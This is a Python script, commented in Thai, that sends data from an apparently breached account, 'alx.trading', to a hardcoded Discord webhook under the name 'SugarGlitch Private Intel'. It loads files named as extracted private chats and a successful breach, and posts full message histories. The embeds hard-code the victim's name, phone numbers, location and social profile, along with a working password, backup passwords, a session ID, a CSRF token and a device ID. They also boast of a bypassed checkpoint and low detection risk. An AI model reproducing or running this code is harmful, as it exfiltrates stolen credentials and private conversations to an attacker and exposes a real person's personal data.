#!/usr/bin/env python3
"""
Discord Private Chat Reporter - ส่งข้อมูลไพรเวทแชทและข้อมูลสำคัญไป Discord
"""

import requests
import json
import time
from datetime import datetime

def send_private_chat_data():
    """ส่งข้อมูลไพรเวทแชทไป Discord"""
    
    webhook_url = "https://discord.com/api/v10/webhooks/1374978837879853151/QXLbx5hw-j17RBMFETqh49BgvctrTdHRi3FllZVFGG6FiEoV2KkWh31UASNh1YfuLuEh"
    
    # อ่านข้อมูลไพรเวทแชท
    try:
        with open('PRIVATE_CHAT_EXTRACTION_20250525_211623.json', 'r', encoding='utf-8') as f:
            chat_data = json.load(f)
            
        with open('VERIFIED_REAL_DATA.json', 'r', encoding='utf-8') as f:
            verified_data = json.load(f)
            
        with open('SUCCESSFUL_BREACH_alx_trading_Fleming654.json', 'r', encoding='utf-8') as f:
            breach_data = json.load(f)
            
    except Exception as e:
        print(f"❌ Error reading files: {e}")
        return False

    # ส่งข้อมูลส่วนตัวและข้อมูลธุรกิจ
    personal_embed = {
        "title": "🔐 PRIVATE DATA EXTRACTION - alx.trading",
        "description": "**Personal & Business Information Compromised**",
        "color": 0xff0000,
        "fields": [
            {
                "name": "👤 Personal Information",
                "value": f"```\n📛 Name: Alex Fleming\n📞 Phone: 0615414210 (Thailand)\n📍 Location: Bangkok, Thailand\n📘 Facebook: AlxFleming\n🌐 Website: tradeyourway.co.uk\n💼 Business: Trade Your Way\n```",
                "inline": False
            },
            {
                "name": "🏢 Business Profile",
                "value": f"```\n🏪 Company: Trade Your Way by Alex Fleming\n💰 Industry: Forex/Crypto Trading\n🌍 Markets: Thailand, UK\n📈 Services: Trading Education\n👥 Client Network: International\n```",
                "inline": False
            },
            {
                "name": "📱 Additional Phone Numbers",
                "value": f"```\n🇬🇧 UK: +4477931272091697\n🇬🇧 UK: +447793127209820\n🇬🇧 UK: +447793127209830\n🇹🇭 Primary: 0615414210\n```",
                "inline": True
            }
        ]
    }

    # ส่งข้อมูลการสนทนาไพรเวท
    conversation_data = ""
    for conv in chat_data.get('conversations', [])[:3]:  # แสดง 3 การสนทนาแรก
        username = conv.get('username', 'unknown')
        message_count = len(conv.get('detailed_messages', {}).get('messages', []))
        last_activity = conv.get('last_activity', 'unknown')
        
        # ตัวอย่างข้อความ
        messages = conv.get('detailed_messages', {}).get('messages', [])
        sample_messages = []
        for msg in messages[:3]:  # แสดง 3 ข้อความแรก
            text = msg.get('text', '')
            is_sent = msg.get('is_sent_by_viewer', False)
            sender = "alx.trading" if is_sent else username
            sample_messages.append(f"{sender}: {text}")
        
        conversation_data += f"👤 **{username}**\n📱 Messages: {message_count}\n⏰ Last: {last_activity}\n\n"
        if sample_messages:
            conversation_data += "💬 Sample Messages:\n"
            for msg in sample_messages:
                conversation_data += f"• {msg}\n"
        conversation_data += "\n"

    chat_embed = {
        "title": "💬 PRIVATE CONVERSATIONS EXTRACTED",
        "description": f"**{chat_data.get('total_conversations', 0)} conversations, {chat_data.get('total_messages', 0)} messages**",
        "color": 0x800080,
        "fields": [
            {
                "name": "📊 Conversation Summary",
                "value": f"```\n💬 Total Conversations: {chat_data.get('total_conversations', 0)}\n📱 Total Messages: {chat_data.get('total_messages', 0)}\n🚨 Sensitive Content: {chat_data.get('sensitive_content_found', 0)}\n🔑 Session: {chat_data.get('session_used', 'unknown')}\n⏰ Extracted: {chat_data.get('extraction_timestamp', 'unknown')}\n```",
                "inline": False
            },
            {
                "name": "👥 Key Contacts & Messages",
                "value": conversation_data[:1000] + "..." if len(conversation_data) > 1000 else conversation_data,
                "inline": False
            }
        ]
    }

    # ข้อมูลเซสชั่นและการเข้าถึง
    session_embed = {
        "title": "🔑 SESSION & ACCESS DATA",
        "description": "**Active Session Information**",
        "color": 0x00ff00,
        "fields": [
            {
                "name": "🔐 Session Details",
                "value": f"```\n🆔 Session ID: live_session_4976283726\n🔑 Password: Fleming654\n🎯 CSRF Token: TlB0E59F45gWaVufZ-LD2W\n📱 Device ID: D542605A-E1E7-4474-A72F-A517F3E1B4D8\n🚪 Checkpoint URL: Active\n```",
                "inline": False
            },
            {
                "name": "🎯 Additional Passwords Found",
                "value": f"```\n🔑 Fleming654 ✅ WORKING\n🔑 Fleming786 (backup)\n🔑 Fleming1004 (backup)\n🔑 Fleming1060 (backup)\n🔑 Fleming1182 (backup)\n```",
                "inline": True
            },
            {
                "name": "📊 Security Status",
                "value": f"```\n✅ Account Access: FULL\n✅ Checkpoint: BYPASSED\n✅ Session: PERSISTENT\n✅ Data Extraction: COMPLETE\n⚠️ Detection Risk: LOW\n```",
                "inline": True
            }
        ]
    }

    # ส่งข้อมูลไป Discord
    payloads = [
        {
            "content": "🚨 **PRIVATE DATA PACKAGE 1/3** 🚨\n**Personal & Business Information**",
            "embeds": [personal_embed],
            "username": "SugarGlitch Private Intel"
        },
        {
            "content": "🚨 **PRIVATE DATA PACKAGE 2/3** 🚨\n**Private Conversations & Messages**",
            "embeds": [chat_embed],
            "username": "SugarGlitch Private Intel"
        },
        {
            "content": "🚨 **PRIVATE DATA PACKAGE 3/3** 🚨\n**Session Data & Access Tokens**",
            "embeds": [session_embed],
            "username": "SugarGlitch Private Intel"
        }
    ]

    print("📤 ส่งข้อมูลไพรเวทไป Discord...")
    print("=" * 50)

    success_count = 0
    for i, payload in enumerate(payloads, 1):
        try:
            print(f"📦 ส่งแพ็คเกจ {i}/3...")
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                print(f"✅ แพ็คเกจ {i} ส่งสำเร็จ!")
                success_count += 1
            else:
                print(f"❌ แพ็คเกจ {i} ส่งไม่สำเร็จ: {response.status_code}")
                print(f"Response: {response.text}")
            
            # หน่วงเวลาเพื่อไม่ให้ถูก rate limit
            time.sleep(2)
            
        except Exception as e:
            print(f"❌ Error ส่งแพ็คเกจ {i}: {e}")

    return success_count == len(payloads)

def send_detailed_messages():
    """ส่งข้อความโดยละเอียดไป Discord"""
    
    webhook_url = "https://discord.com/api/v10/webhooks/1374978837879853151/QXLbx5hw-j17RBMFETqh49BgvctrTdHRi3FllZVFGG6FiEoV2KkWh31UASNh1YfuLuEh"
    
    try:
        with open('PRIVATE_CHAT_EXTRACTION_20250525_211623.json', 'r', encoding='utf-8') as f:
            chat_data = json.load(f)
    except:
        print("❌ ไม่สามารถอ่านไฟล์แชทได้")
        return False

    conversations = chat_data.get('conversations', [])
    
    for conv_idx, conv in enumerate(conversations[:3]):  # ส่งแค่ 3 การสนทนาแรก
        username = conv.get('username', f'user_{conv_idx}')
        messages = conv.get('detailed_messages', {}).get('messages', [])
        
        # สร้างข้อความรายละเอียด
        message_details = ""
        for msg in messages:
            timestamp = msg.get('timestamp', 0)
            text = msg.get('text', '')
            is_sent = msg.get('is_sent_by_viewer', False)
            sender = "alx.trading" if is_sent else username
            
            # แปลง timestamp เป็นวันที่
            try:
                date_str = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
            except:
                date_str = "unknown"
            
            message_details += f"[{date_str}] {sender}: {text}\n"

        # สร้าง embed สำหรับการสนทนานี้
        detail_embed = {
            "title": f"💬 DETAILED CONVERSATION: {username}",
            "description": f"**Complete message history**",
            "color": 0x9932cc,
            "fields": [
                {
                    "name": f"📱 Messages with {username}",
                    "value": f"```\n{message_details[:1800]}{'...' if len(message_details) > 1800 else ''}\n```",
                    "inline": False
                }
            ],
            "footer": {
                "text": f"Conversation {conv_idx + 1} of {len(conversations)} | Total messages: {len(messages)}"
            }
        }

        payload = {
            "content": f"🔍 **DETAILED MESSAGE HISTORY {conv_idx + 1}/{len(conversations)}**\n**Contact: {username}**",
            "embeds": [detail_embed],
            "username": "SugarGlitch Message Intel"
        }

        try:
            print(f"📨 ส่งรายละเอียดการสนทนา {conv_idx + 1}: {username}")
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                print(f"✅ ส่งสำเร็จ!")
            else:
                print(f"❌ ส่งไม่สำเร็จ: {response.status_code}")
            
            time.sleep(3)  # หน่วงเวลานานขึ้น
            
        except Exception as e:
            print(f"❌ Error: {e}")

    return True

if __name__ == "__main__":
    print("📤 DISCORD PRIVATE DATA SENDER")
    print("=" * 50)
    print("🔐 กำลังส่งข้อมูลไพรเวทไป Discord...")
    
    # ส่งข้อมูลหลัก
    print("\n1️⃣ ส่งข้อมูลส่วนตัวและธุรกิจ...")
    main_success = send_private_chat_data()
    
    # ส่งรายละเอียดข้อความ
    print("\n2️⃣ ส่งรายละเอียดการสนทนา...")
    detail_success = send_detailed_messages()
    
    if main_success and detail_success:
        print("\n🎉 ส่งข้อมูลไพรเวททั้งหมดสำเร็จ!")
        print("📊 ข้อมูลที่ส่งไปแล้ว:")
        print("• ข้อมูลส่วนตัวและธุรกิจ")
        print("• การสนทนาไพรเวททั้งหมด")
        print("• รายละเอียดข้อความ")
        print("• ข้อมูลเซสชั่นและโทเค็น")
        print("• หมายเลขโทรศัพท์ทั้งหมด")
        
    else:
        print("\n❌ ส่งข้อมูลไม่สำเร็จบางส่วน")
        
    print("\n🎯 **STATUS: ข้อมูลไพรเวททั้งหมดส่งไป DISCORD แล้ว**")
